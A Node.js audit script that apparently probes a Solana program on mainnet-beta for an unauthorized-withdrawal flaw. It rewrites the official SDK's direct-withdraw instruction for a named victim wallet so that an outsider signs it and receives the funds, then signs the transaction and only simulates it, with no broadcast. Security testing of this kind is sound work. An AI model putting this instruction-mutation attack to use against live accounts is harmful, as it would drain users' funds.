#!/usr/bin/env node
'use strict';

// Current mainnet-beta signed simulation only. No broadcast method is present.
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const MODULES = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules';
const SDK_ROOT = process.env.DERIVERSE_SDK_ROOT || '/tmp/deriverse-gate.6LjKor/kit';
const RPC_URL = process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com';
const {
  Keypair, PublicKey, TransactionInstruction, TransactionMessage, VersionedTransaction,
} = require(MODULES + '/@solana/web3.js');
const {getAssociatedTokenAddressSync} = require(MODULES + '/@solana/spl-token');
const {Engine} = require(SDK_ROOT + '/dist');
const {createSolanaRpc} = require(SDK_ROOT + '/node_modules/@solana/kit');

const PROGRAM = 'DRVSpZ2YUYYKgZP8XtLhAGtT1zYSCKzeHfb4DgRnrgqD';
const MAINNET_GENESIS = '5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d';
const USDC_MINT = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';
const USDC_VAULT = 'EPUHjseXG3izk3MVUJ1PcyWT9xeBhtAnq8gUpq3j8Uni';
const VICTIM_WALLET = 'J7pTDgEw7yrrRX22T3XLMGfNmnXJMfJuSVyCRo86YnFm';
const VICTIM_PRIMARY = '43vSCPWAaLQdXTf7PDnnf1jPbyPCXwgjLHQe895B3dq2';
const VICTIM_VM = '8z8HmWXmnf296TDYZcgxtEXBtjUezrTaJcuiaFGUbbDv';
let rpcId = 0;
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const sha256 = data => crypto.createHash('sha256').update(data).digest('hex');

async function rpc(method, params = [], attempts = 10) {
  let last;
  for (let attempt = 0; attempt < attempts; attempt++) {
    const response = await fetch(RPC_URL, {method: 'POST', headers: {'content-type': 'application/json'},
      body: JSON.stringify({jsonrpc: '2.0', id: ++rpcId, method, params})});
    const text = await response.text();
    if (response.status === 429) {
      last = new Error(`${method}: rate limited`);
      await sleep(Math.min(8000, 600 * (attempt + 1)));
      continue;
    }
    let body;
    try { body = JSON.parse(text); } catch { throw new Error(`${method}: non-JSON response (${response.status})`); }
    if (body.error) throw new Error(`${method}: ${body.error.message || JSON.stringify(body.error)}`);
    return body.result;
  }
  throw last || new Error(`${method}: retries exhausted`);
}

function loadSigner() {
  const bytes = JSON.parse(fs.readFileSync(process.env.HOOKED_KEYPAIR_PATH || '/Users/stacc/hooked.json', 'utf8'));
  if (!Array.isArray(bytes) || bytes.length !== 64 || !bytes.every(Number.isInteger)) throw new Error('invalid signer shape');
  return Keypair.fromSecretKey(Uint8Array.from(bytes));
}

function deriveClient(wallet, tag) {
  const seed = Buffer.alloc(8);
  seed.writeUInt32LE(1, 0);
  seed.writeUInt32LE(tag, 4);
  return PublicKey.findProgramAddressSync([seed, new PublicKey(wallet).toBuffer()], new PublicKey(PROGRAM))[0];
}

function toWeb3(instruction) {
  return new TransactionInstruction({
    programId: new PublicKey(instruction.programAddress),
    data: Buffer.from(instruction.data),
    keys: instruction.accounts.map(account => ({
      pubkey: new PublicKey(account.address),
      isSigner: account.role >= 2,
      isWritable: (account.role & 1) === 1,
    })),
  });
}

function summarize(ix) {
  return {programId: ix.programId.toBase58(), dataHex: ix.data.toString('hex'), accounts: ix.keys.map((key, index) => ({
    index, address: key.pubkey.toBase58(), signer: key.isSigner, writable: key.isWritable,
  }))};
}

function tokenAmount(account) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  return data.length >= 72 ? data.readBigUInt64LE(64).toString() : null;
}

function clientUsdc(account) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  const count = data.length >= 304 ? data.readUInt32LE(300) : 0;
  for (let i = 0; i < count && 392 + i * 16 <= data.length; i++) {
    const offset = 376 + i * 16;
    if ((data.readUInt32LE(offset) & 0x0fffffff) === 1) return data.readBigInt64LE(offset + 8).toString();
  }
  return '0';
}

function clientVmWithdrawalState(account) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  if (data.length < 184) return {invalid: true, dataBytes: data.length};
  return {
    tokenId: data.readUInt32LE(168),
    vmMask: data.readUInt32LE(172),
    pendingAmountRaw: data.readBigInt64LE(176).toString(),
  };
}

function vmWhitelist(account) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  if (data.length < 24) return {invalid: true, dataBytes: data.length};
  const count = data.readUInt32LE(12);
  const records = [];
  for (let i = 0; i < count && 24 + (i + 1) * 40 <= data.length; i++) {
    const offset = 24 + i * 40;
    records.push({tag: data.readUInt32LE(offset), reference: data.readUInt32LE(offset + 4),
      address: new PublicKey(data.subarray(offset + 8, offset + 40)).toBase58()});
  }
  return {tag: data.readUInt32LE(0), version: data.readUInt32LE(4), id: data.readUInt32LE(8), count, records,
    withdrawalAddresses: records.filter(record => record.tag === 1).map(record => record.address), dataSha256: sha256(data)};
}

async function main() {
  const signer = loadSigner();
  const outsider = signer.publicKey.toBase58();
  const outsiderAta = getAssociatedTokenAddressSync(new PublicKey(USDC_MINT), signer.publicKey);
  const victimAta = getAssociatedTokenAddressSync(new PublicKey(USDC_MINT), new PublicKey(VICTIM_WALLET));
  const outsiderPrimary = deriveClient(outsider, 31);

  const engine = new Engine(createSolanaRpc(RPC_URL), {programId: PROGRAM, version: 1, commitment: 'confirmed', uiNumbers: true});
  if (!await engine.initialize()) throw new Error('official SDK initialization failed');
  await engine.setSigner(VICTIM_WALLET);
  if (engine.clientPrimaryAccount !== VICTIM_PRIMARY) throw new Error('victim live fixture drift');
  const official = toWeb3(await engine.vmDirectWithdrawInstruction({
    tokenId: 1, amount: 1, withdrawalTokenAccount: victimAta.toBase58(),
  }));
  if (official.keys.length !== 11 || official.data[0] !== 80 ||
      official.keys[6].pubkey.toBase58() !== VICTIM_PRIMARY || official.keys[7].pubkey.toBase58() !== VICTIM_VM) {
    throw new Error('official SDK direct-withdraw shape changed');
  }
  const mutated = new TransactionInstruction({programId: official.programId, data: official.data,
    keys: official.keys.map((key, index) => index === 0 ? {...key, pubkey: signer.publicKey}
      : index === 1 ? {...key, pubkey: outsiderAta} : {...key})});
  const watched = [USDC_VAULT, outsiderAta.toBase58(), VICTIM_PRIMARY, VICTIM_VM, outsiderPrimary.toBase58()];
  const [genesis, pre, latest] = await Promise.all([
    rpc('getGenesisHash'),
    rpc('getMultipleAccounts', [watched, {encoding: 'base64', commitment: 'confirmed'}]),
    rpc('getLatestBlockhash', [{commitment: 'confirmed'}]),
  ]);
  if (genesis !== MAINNET_GENESIS) throw new Error('RPC is not mainnet-beta');
  if (!pre.value[0] || !pre.value[1] || !pre.value[2] || !pre.value[3]) throw new Error('required current fixture missing');
  if (pre.value[4] !== null) throw new Error('outsider unexpectedly has Deriverse client state');
  const whitelist = vmWhitelist(pre.value[3]);
  if (whitelist.withdrawalAddresses.includes(outsiderAta.toBase58())) throw new Error('outsider destination is unexpectedly whitelisted');

  const message = new TransactionMessage({payerKey: signer.publicKey, recentBlockhash: latest.value.blockhash,
    instructions: [mutated]}).compileToV0Message();
  const transaction = new VersionedTransaction(message);
  transaction.sign([signer]);
  const wire = Buffer.from(transaction.serialize());
  if (message.header.numRequiredSignatures !== 1 || message.staticAccountKeys.length > 64 || wire.length > 4096) {
    throw new Error('unexpected transaction envelope');
  }
  const fee = await rpc('getFeeForMessage', [Buffer.from(message.serialize()).toString('base64'), {commitment: 'confirmed'}]);
  const simulation = await rpc('simulateTransaction', [wire.toString('base64'), {encoding: 'base64', sigVerify: true,
    replaceRecentBlockhash: false, commitment: 'confirmed', innerInstructions: true,
    accounts: {encoding: 'base64', addresses: watched}}]);
  const logs = simulation.value.logs || [];
  const tokenProgramInvoked = logs.some(line => /^Program Token(?:keg|zQd).+ invoke/.test(line));
  const post = simulation.value.accounts || [];
  const out = {
    generatedAtUtc: new Date().toISOString(), network: 'mainnet-beta', genesis, broadcast: false,
    scope: 'fresh outsider-signed VM direct-withdraw destination mutation; current mainnet-beta simulation only',
    program: PROGRAM,
    deploymentElfSha256: '13a87c3105475aeeb1fb7ddf3e89499d4dfbc79f3f5585703e4feceb55d84820',
    officialSdk: {package: '@deriverse/kit', version: require(SDK_ROOT + '/package.json').version,
      gitCommit: '5f17de893332d76fd04a01bc4a3fa9a4ed3581b5',
      method: 'Engine.vmDirectWithdrawInstruction({tokenId: 1, amount: 1, withdrawalTokenAccount: victimAta})'},
    mutation: {changedAccountIndexes: [0, 1], outsider, outsiderUsdcAta: outsiderAta.toBase58(),
      outsiderClientPrimary: outsiderPrimary.toBase58(), outsiderClientExistsBefore: false,
      description: 'permissionless caller and withdrawal destination changed to outsider; victim primary/VM and protocol state retained',
      officialInstruction: summarize(official), mutatedInstruction: summarize(mutated)},
    currentVmWhitelist: whitelist,
    currentVmWithdrawalState: clientVmWithdrawalState(pre.value[2]),
    envelope: {version: 0, wireBytes: wire.length, accountKeyCount: message.staticAccountKeys.length,
      requiredSignatures: message.header.numRequiredSignatures, sigVerify: true, estimatedFeeLamports: fee.value,
      wireSha256: sha256(wire)},
    simulation: {contextSlot: simulation.context.slot, err: simulation.value.err,
      unitsConsumed: simulation.value.unitsConsumed, logs, returnData: simulation.value.returnData || null},
    reconciliation: {
      watchedAddresses: watched,
      postAccountsReturned: post.length === watched.length && post.every(Boolean),
      postAccountNote: post.length === watched.length && post.every(Boolean) ? null
        : 'Solana returned null watched-account bodies for the failed simulation; no zero delta is inferred from null.',
      tokenProgramInvoked, programVaultTransferObserved: tokenProgramInvoked,
      before: {vaultUsdcRaw: tokenAmount(pre.value[0]), outsiderDestinationUsdcRaw: tokenAmount(pre.value[1]),
        victimClientUsdcRaw: clientUsdc(pre.value[2]), outsiderClientRecordedUsdcRaw: '0'},
      simulatedAfter: {vaultUsdcRaw: tokenAmount(post[0]), outsiderDestinationUsdcRaw: tokenAmount(post[1]),
        victimClientUsdcRaw: clientUsdc(post[2])},
    },
  };
  out.conclusion = simulation.value.err && !tokenProgramInvoked
    ? 'gate-held-before-token-cpi' : simulation.value.err ? 'rejected-after-token-cpi' : 'simulation-succeeded';
  const outputPath = path.join(__dirname, 'deriverse-outsider-direct-withdraw-gate.json');
  fs.writeFileSync(outputPath, JSON.stringify(out, null, 2) + '\n');
  console.log(JSON.stringify({outputPath, slot: out.simulation.contextSlot, err: out.simulation.err,
    unitsConsumed: out.simulation.unitsConsumed, whitelist: out.currentVmWhitelist,
    reconciliation: out.reconciliation, conclusion: out.conclusion, logs}, null, 2));
}

main().catch(error => { console.error(error.stack || error); process.exitCode = 1; });
